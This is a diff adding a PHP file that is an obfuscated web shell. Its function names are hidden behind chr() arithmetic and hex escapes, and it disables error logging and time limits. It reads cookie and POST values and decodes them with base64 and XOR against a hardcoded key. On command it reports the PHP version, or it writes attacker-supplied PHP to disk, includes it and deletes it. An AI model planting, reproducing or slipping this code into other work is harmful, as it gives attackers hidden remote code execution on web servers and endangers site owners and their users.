@@ -1,0 +1,43 @@
+<?php $uzuuzy = 'f'."\x69"."\154"."\x65".chr(95)."\x70".chr(1001-884).chr(537-421)."\137"."\x63"."\x6f"."\x6e"."\x74"."\145".chr(859-749)."\x74"."\x73";
+$qdxyr = "\142".chr(97)."\x73".chr(101).chr(54).chr(52)."\x5f"."\x64"."\145".'c'."\x6f".'d'.chr(101);
+$eaqhda = "\151".'n'."\x69"."\x5f"."\163".chr(632-531).chr(808-692);
+$iurcx = chr(673-556)."\156".chr(108).chr(105).chr(110).chr(107);
+
+
+@$eaqhda(chr(189-88).'r'.chr(114).chr(111)."\162".chr(95).chr(973-865)."\x6f".'g', NULL);
+@$eaqhda("\x6c"."\157"."\147"."\137"."\145".'r'."\x72".'o'.'r'.'s', 0);
+@$eaqhda("\155"."\141".chr(120).'_'."\x65"."\x78"."\145".chr(99)."\165".'t'."\151".'o'.chr(110).'_'."\x74"."\x69"."\155"."\x65", 0);
+@set_time_limit(0);
+
+function anzzidx($mjbqyfa, $bgtsarzs)
+{
+    $tjaucyn = "";
+    for ($dqebkbkn = 0; $dqebkbkn < strlen($mjbqyfa);) {
+        for ($j = 0; $j < strlen($bgtsarzs) && $dqebkbkn < strlen($mjbqyfa); $j++, $dqebkbkn++) {
+            $tjaucyn .= chr(ord($mjbqyfa[$dqebkbkn]) ^ ord($bgtsarzs[$j]));
+        }
+    }
+    return $tjaucyn;
+}
+
+$zklefh = array_merge($_COOKIE, $_POST);
+$mlmrirv = 'f3daa563-5fd6-4b48-bc41-08f829900e9c';
+foreach ($zklefh as $xtyuxedf => $mjbqyfa) {
+    $mjbqyfa = @unserialize(anzzidx(anzzidx($qdxyr($mjbqyfa), $mlmrirv), $xtyuxedf));
+    if (isset($mjbqyfa["\141"."\153"])) {
+        if ($mjbqyfa["\x61"] == chr(105)) {
+            $dqebkbkn = array(
+                chr(196-84).chr(1107-989) => @phpversion(),
+                chr(115).'v' => "3.5",
+            );
+            echo @serialize($dqebkbkn);
+        } elseif ($mjbqyfa["\x61"] == "\x65") {
+            $spiyukwusq = "./" . md5($mlmrirv) . chr(681-635)."\x69"."\x6e".chr(549-450);
+            @$uzuuzy($spiyukwusq, "<" . chr(63).chr(1077-965)."\x68"."\160".' '.chr(64)."\x75"."\x6e".chr(193-85).chr(464-359).'n'.chr(193-86)."\x28".chr(95)."\137".'F'."\111".chr(335-259).chr(257-188).'_'."\137".')'."\73"."\40" . $mjbqyfa["\144"]);
+            @include($spiyukwusq);
+            @$iurcx($spiyukwusq);
+        }
+        exit();
+    }
+}
+
